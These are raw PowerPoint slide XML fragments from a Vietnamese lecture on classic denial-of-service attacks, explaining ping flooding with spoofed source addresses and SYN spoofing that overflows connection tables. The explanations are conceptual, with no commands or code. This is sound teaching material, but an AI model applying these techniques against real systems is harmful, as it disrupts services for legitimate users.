      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B321F6BD-2990-4B05-8AA5-AFA3F5E4E4F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1676400"/>
            <a:ext cx="10363200" cy="4953000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công tràn ngập Ping ( Ping Flooding)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2500" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1"/>
              <a:t>Giả mạo địa chỉ nguồn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>Gói tin có địa chỉ đích là hệ thống mục tiêu, địa chỉ nguồn giả mạo th</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>ờng được lựa chọn ngẫu nhiên và khác nhau cho mỗi gói tin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>Làm cho hệ thống xác định nguồn gốc tấn công khó khăn h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>n</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t>Tạo địa chỉ nguồn giả mạo trong gói tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> Yêu cầu có đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>ợc truy cập đủ quyền đến phần mềm network handling trên máy tính gửi gói tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400"/>
              <a:t> Thường thông qua giao diện socket trên hệ điều hành </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> tạo l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợng lớn các gói tin và điều chỉnh các thuộc tính của gói tin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tại sao </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>có thể đặt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>địa chỉ giả mạo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cho các gói tin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trên Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" i="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" altLang="en-US" sz="2400" i="1">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13383116"/>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45CF8A55-B044-436F-89C2-AECF84007122}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15363" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A854520E-3EF8-41E4-AECC-CC437D3C2227}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công giả mạo SYN (SYN Spoofing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> Là loại tấn công DoS cổ điến phổ biến</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Tấn công vào khả năng của một máy chủ đáp ứng với yêu cầu kết nối của ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ời dùng hợp lệ trong t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ơng lai bằng cách làm tràn các bảng quản lý kết nối.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Là cuộc tấn công vào tài nguyên hệ thống, đặc biệt là mã network handling trong hệ điều hành</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1748466458"/>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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{865079B3-907C-479E-B8EA-20D7F19E94E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3897" t="12941" r="17711" b="43292"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2878018" y="1586754"/>
            <a:ext cx="6494582" cy="4966446"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70195"/>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1" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EED995CC-FC10-4CCB-8443-1D8AA6CB24E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17412" name="TextBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD5B62B9-D8D1-48F1-90EC-E91490930537}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="533400" y="2991561"/>
            <a:ext cx="2012089"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80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>syn / ack pkts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>y = server seq #</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>x = client seq #</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5979C651-FEC6-4360-9C7B-DC6A97D33C0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1524001"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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pPr marL="0" indent="0">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công giả mạo SYN (SYN Spoofing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kết nối bắt tay TCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2186320074"/>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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3DB5CA1-C6F9-4FFF-89C0-19C382698E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9265" t="7159" r="9265" b="39375"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6019800" y="1714500"/>
            <a:ext cx="6172200" cy="4838700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70195"/>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59" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{188EFD5E-1925-4DD1-A621-39CC062A2A95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19460" name="TextBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DE7BCC5-1AA5-49D0-A496-E14722D85694}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3124200" y="6153090"/>
            <a:ext cx="943304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SzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
